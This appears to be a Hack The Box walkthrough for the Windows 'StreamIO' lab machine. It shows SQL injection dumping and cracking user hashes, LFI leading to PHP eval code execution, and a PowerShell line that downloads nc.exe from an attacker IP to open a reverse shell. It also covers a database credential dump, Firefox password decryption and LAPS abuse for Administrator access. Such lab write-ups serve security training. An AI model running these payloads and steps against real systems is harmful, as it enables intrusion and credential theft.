<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-560c-47c7-9704-e8d336539e3e.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>4 Jun 2022</td></tr>
      </table>
    </div>
  </div>
</div>

---

# Enumeration
nmap scan for all ports
```bash
nmap -p- --min-rate 1000 --open 10.129.65.51
```

output:
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49707/tcp open  unknown
```

so we have these services open:
dns - 53
http - 80
kerberos - 88
msrpc - 135
netbios - 139
ldap - 389
https - 443
smb - 445
kpasswd - 464
rpc-epmap - 593
ldaps - 636
gc-ldap - 3268
gc-ldaps - 3269
winrm - 5985
adws - 9389

another nmap scan, but now detailed:
```bash
sudo nmap -v -sV -sC -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 10.129.65.51
```

output:
```bash
PORT     STATE SERVICE       VERSION                                
53/tcp   open  domain        (unknown banner: Q9-U-2026080500)
| dns-nsid:                                    
|   NSID: res701.qarn2 (7265733730312e7161726e32)
|   id.server: res701.qarn2                    
|_  bind.version: Q9-P-2026080500      
| fingerprint-strings:                 
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    Q9-U-2026080500
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:             
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-01 19:58:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn          
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
|_ssl-date: 2026-10-01T20:00:05+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:     b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
| SHA-1:   6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
|_SHA-256: 1efc 48cc 0bd9 757f c585 d1fb 7e52 5009 ed0a a3e9 9acc 1a97 0b26 8418 6801 bf09
| tls-alpn:
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.99%I=7%D=10/1%Time=6ABE58F9%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3C,"\0:\0\x06\x85\x80\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x10\x0fQ9-U-20260805
SF:00");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

found domains:
* `streamIO.htb`
* `watch.streamIO.htb`
add these to the `/etc/hosts`


clock skew is 7 hours. so if we will be doing smt with kerberos related we have to sync our time...

first i'll enum some interesting services:

dns
```bash
dig any streamIO.htb

; <<>> DiG 9.20.27-2-Debian <<>> any streamIO.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOTIMP, id: 45171
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; EDE: 21 (Not Supported)
;; QUESTION SECTION:
;streamIO.htb.                  IN      ANY

;; Query time: 115 msec
;; SERVER: 192.168.1.1#53(192.168.1.1) (TCP)
;; WHEN: Thu Oct 01 16:07:45 MSK 2026
;; MSG SIZE  rcvd: 47
```
zone transfer failed... also i tried to access smb with null or guest but no use, rpc also not accessible...


## web enumeration
checking the web page, we got default windows page... using http protocol
![[Pasted image 20261001155928.png]]

now i want to access `watch.streamio.htb` with https:
![[Pasted image 20261001161037.png]]

and `streamio.htb` with https:
![[Pasted image 20261001161149.png]]

### streamio.htb
this is php website. 
we have this login page. 
tried basic sql bypass techs but no use.

lets register:
![[Pasted image 20261001162258.png]]

it's created
![[Pasted image 20261001162327.png]]

but strange, i cant log in...
![[Pasted image 20261001162412.png]]

also there is some "contact us" form. looks like it doing something. i mean not junk.. 
![[Pasted image 20261001162825.png]]

tried to send this, but no connection back...
![[Pasted image 20261003081738.png]]

i started directory enum:
```bash
ffuf -u 'https://streamio.htb/FUZZ' -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e php
```
nothing new was found...
![[Pasted image 20261001164505.png]]


### watch.streamio.htb
lets enum on subdomain for dirs:
```bash
gobuster dir -u https://watch.streamio.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -k
```

found this shit:
```
search.php           (Status: 200) [Size: 253887]
static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]       
index.php            (Status: 200) [Size: 2829]
blocked.php          (Status: 200) [Size: 677]
```

blocked.php
![[Pasted image 20261001171509.png]]

search.php looks like sql injectable...
![[Pasted image 20261001171539.png]]


### SQL Injection 
I typed: `' or 1=1 -- -` it refered me to blocked.php page

I saved the request from burp and gave it to sqlmap.
```bash
sqlmap -r req
sqlmap -r req --level 5 --risk 3 --random-agent
```

only found boolean-based blind..
```
[17:29:40] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 690 HTTP(s) requests:
---                              
Parameter: #1* ((custom) POST)                                                                
    Type: boolean-based blind   
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=%' AND 7298=7298 AND 'oaKs%'='oaKs
---                                                                                           
[17:29:56] [INFO] testing MySQL
```

I also tried to do it manually...

when i typed - `car'; -- `. i got. 
![[Pasted image 20261001174251.png]]
looks like the search request is using wildcard or something. and with my request i broke it. and only films that end with the car was shown.

this web blocks `null`...

so lets try union injection and first I have to find numbers of columns:
```
asdfqwef' union select 1,2,3,4,5,6; -- -
```

we got hit
![[Pasted image 20261001175720.png]]

so there is 6 columns

the version:
```
asdfqwef' union select 1,@@version,3,4,5,6; -- -
```
output:
```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor)
```

on random I typed this. And i got it:
```
asdfqwef' union select 1,username,3,4,5,6 from users; -- -
```

output:
![[Pasted image 20261001180533.png]]


now lets also get passwords:
```
' UNION SELECT 1,username+':'+password,3,4,5,6 FROM users-- -
```

looks like md5 hashes...
```
admin:21232f297a57a5a743894a0e4a801fc3
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
fucker:aac0a9daa4185875786c9ed154f0dece
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
qwer:bb11978ab07b6d57f2555f6876cf511a
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

put this all into file and crack it
```bash
hashcat -m 0 hashes --username /usr/share/wordlists/rockyou.txt
```

we got these hashes cracked
```
aac0a9daa4185875786c9ed154f0dece:fucker        
3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
21232f297a57a5a743894a0e4a801fc3:admin         
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i    
665a50ac9eaa781e4f7f04199db97a11:paddpadd      
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara       
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW        
6dcd87740abb64edfa36d170f0d5450d:$3xybitch     
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123   
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!    
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

so we have this creds...
```
fucker:fucker
Thane:highschoolmusical
admin:admin
Lenord:physics69i
admin:paddpadd
yoshihide:66boysandgirls..
Clara:%$clara
Bruno:$monique$1991$
Barry:$hadoW
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Michelle:!?Love?!123
Victoria:!5psycho8!
Sabrina:!!sabrina$
```


now i tried these creds on other services but no use....

tried on `streamio.htb`. and I got accessed with this user `yoshihide:66boysandgirls..`


### LFI -> RCE

so we have admin panel in access now
![[Pasted image 20261001182020.png]]

some strange empty parametr...
![[Pasted image 20261001182421.png]]

![[Pasted image 20261001182428.png]]

lets fuzz it...
```bash
ffuf -u 'https://streamio.htb/admin/?FUZZ=value' -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=2n80pt58a8htjqvqjitsctaad8" -fs 1678
```
![[Pasted image 20261003082837.png]]

new parametr - `debug`

also lets enum for dirs:
```bash
gobuster dir -u https://streamio.htb/admin/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -k
```

![[Pasted image 20261001183825.png]]

found new  page: `master.php`
![[Pasted image 20261001183855.png]]

and what could it mean...?

now lets test `debug` parametr:
![[Pasted image 20261002111907.png]]

`this option is for developers only`

when i added `index.php` into param value
`this option is for developers only ---- ERROR ----`

then i added `../index.php`
and i got the page...
![[Pasted image 20261002112230.png]]

i could read hosts file
`https://streamio.htb/admin/?debug=../../../../../Windows\System32\drivers\etc\hosts`
![[Pasted image 20261002112629.png]]

tryed php://filter and it worked
`https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php`
![[Pasted image 20261002112808.png]]
got source code of index.php...

i will try this tool https://github.com/synacktiv/php_filter_chain_generator/tree/main to make chain of those filter wrappers and get rce...

That shit isnt work so lets try reading some files...

read login.php
`https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=../login.php`

got base64 blob. decode it. and get:
```php
yr<?php
session_start();
define('included',true);
?>
<!DOCTYPE html>
<html>
...SNIP...
<?php
$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
$handle = sqlsrv_connect('(local)',$connection);
function bad_char_check($name)
{
  $bad_chars = array('!','"','#','$','%','&','\\','\'','(',')','*','+',',','-','.','/',':',';','<','=','>','?','@','[',']','^','`','{','|','}','~');
  foreach ($bad_chars as $chars) {
    if (strpos($name,$chars) !== false) {
      return false;
    }
  }
  return true;
}

if(isset($_POST['username']) && isset($_POST['password']))
{
  # login here
    ## Check from db here dbch
    $user = $_POST['username'];
    $pass = md5($_POST['password']);
    $query = "select * from users where username = '$user' and password = '$pass'";
    $res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
    if(sqlsrv_num_rows($res) == 1 && $user === 'yoshihide')
    {
        # Login success
        $_SESSION['logged_in'] = 1;
        # Admin success
        $_SESSION['admin'] = 1;
        header("Location: https://streamio.htb/");
    }
    else
    {
?>
        <div class="alert alert-danger">Login failed</div> 
<?php
    }
}
?>
   ...SNIP
```
found hardcoded logopass: db_user:B1@hB1@hB1@h

but I dont think it ll give something...

in `register.php` i found also hardcoded creds, but now gor **db_admin**:
`$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');`

i just recalled that i also have `master.php` but it wasnt accessible so lets check it out:

full code
```php
<h1>Movie managment</h1>
<?php
if (!defined('included'))
    die("Only accessable through includes");

if (isset($_POST['movie_id'])) {
    $query = "delete from movies where id = " . $_POST['movie_id'];
    $res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));
}

$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));

while ($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) {
?>
    <div>
        <div class="form-control" style="height: 3rem;">
            <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
            <div style="float:right;padding-right: 25px;">
                <form method="POST" action="?movie=">
                    <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                    <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                </form>
            </div>
        </div>
    </div>
<?php
} # while end
?>

<br><hr><br>

<h1>Staff managment</h1>
<?php
if (!defined('included'))
    die("Only accessable through includes");

$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));

if (isset($_POST['staff_id'])) {
?>
    <div class="alert alert-success"> Message sent to administrator</div>
<?php
}

$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));

while ($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) {
?>
    <div>
        <div class="form-control" style="height: 3rem;">
            <h4 style="float:left;"><?php echo $row['username']; ?></h4>
            <div style="float:right;padding-right: 25px;">
                <form method="POST">
                    <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                    <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                </form>
            </div>
        </div>
    </div>
<?php
} # while end
?>

<br><hr><br>

<h1>User managment</h1>
<?php
if (!defined('included'))
    die("Only accessable through includes");

if (isset($_POST['user_id'])) {
    $query = "delete from users where is_staff = 0 and id = " . $_POST['user_id'];
    $res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));
}

$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable" => "buffered"));

while ($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC)) {
?>
    <div>
        <div class="form-control" style="height: 3rem;">
            <h4 style="float:left;"><?php echo $row['username']; ?></h4>
            <div style="float:right;padding-right: 25px;">
                <form method="POST">
                    <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                    <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                </form>
            </div>
        </div>
    </div>
<?php
} # while end
?>

<br><hr><br>

<form method="POST">
    <input name="include" hidden>
</form>

<?php
if (isset($_POST['include'])) {
    if ($_POST['include'] !== "index.php")
        eval(file_get_contents($_POST['include']));
    else
        echo(" ---- ERROR ---- ");
}
?>
```

this is the interesting part:
```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

so this master.php can accept include in POST body. but it has to be included. the thing is that we can gain RCE from this cause of `eval`...


and I also what to see this code /admin/index.php:
```php
...SNIP
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
...SNIP
```

So I have to access master.php through debug param... Lets make following request. I put phpinfo() into base64 encoding so there wont be any unwanted troubles...
```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=2n80pt58a8htjqvqjitsctaad8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

include=data://text/plain;base64,cGhwaW5mbygpOw==
```

And we got it...
![[Pasted image 20261002142601.png]]

now I will get rev shell... first write this and encode in base64
```
system('powershell.exe -c "iwr http://10.10.15.85/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.85 4444"');
```

then make a request:
![[Pasted image 20261002155111.png]]

and we got hit!
![[Pasted image 20261002155124.png]]


### mssql db dump

This user hasn't home directory so we have to dig more to get user flag... I also recalled that we found credentials to database. So lets check those out.

```
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890'
```
This killed my revshell, so i had to use non-interactive way to communicate with db

```
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT name FROM sys.databases"
```
![[Pasted image 20261002162043.png]]

streamio_backup is the most interesting one. Lets check it out. It has table users. I opened it and saw this:

I see a new user... `nikk37`
![[Pasted image 20261002162241.png]]

it's md5 hashes again. crackstation cracked it.![[Pasted image 20261002162310.png]]

lets test this creds -> **nikk37:get_dem_girls2@yahoo.com**

```
netexec smb dc.streamio.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```
we got approved...

Lets try to winrm:
![[Pasted image 20261002162608.png]]

here it is
![[Pasted image 20261002162717.png]]



# Privilege Escalation
### Firefox encrypted passwords

I ran winpeas.exe and it found that firefox is installed and it located it's encrypted passwords...

To decrypt it I used this tool -> https://github.com/lclevy/firepwd

download files called `key4.db` and `logins.json`. and run tool.
![[Pasted image 20261002172127.png]]

We got creds...

Lets test those out:
![[Pasted image 20261002172245.png]]


### LAPS abuse
The second thing I did as `nikk37` I ran bloodhound collector.

Then I search for out new user. Looks like I `own` group called `CORE STAFF`.
![[Pasted image 20261002174510.png]]

This group in particular can read LAPS password...
![[Pasted image 20261002174524.png]]

So to read it I have to add myself to the groups

But first check that I can't read LAPS;
```bash
netexec ldap dc.streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps                

LDAP        10.129.66.2     389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.66.2     389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r                           
LAPS        10.129.66.2     389    DC               [*] Getting LAPS Passwords
LAPS        10.129.66.2     389    DC               [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !
```

Give `GDgodd` GenericAll privileges over this group:
```bash
bloodyAD --host 10.129.66.2 -d dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll 'CORE STAFF' JDgodd  
[+] JDgodd has now GenericAll on CORE STAFF
```

Add `GDgodd` to the group:
```bash
bloodyAD --host 10.129.66.2 -d dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'CORE STAFF' JDgodd  
[+] JDgodd added to CORE STAFF
```

Now we can read LAPS:
```bash
netexec ldap dc.streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps

LDAP        10.129.66.2     389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.66.2     389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
LAPS        10.129.66.2     389    DC               [*] Getting LAPS Passwords
LAPS        10.129.66.2     389    DC               Computer:DC$ User:                Password:[z)Mt8rR/G22.5  
```
![[Pasted image 20261002175421.png]]

```
Computer:DC$ User:                Password:[z)Mt8rR/G22.5
```

**creds** -> `Administrator`:`[z)Mt8rR/G22.5`

And we can auth using winrm and grab our flag...

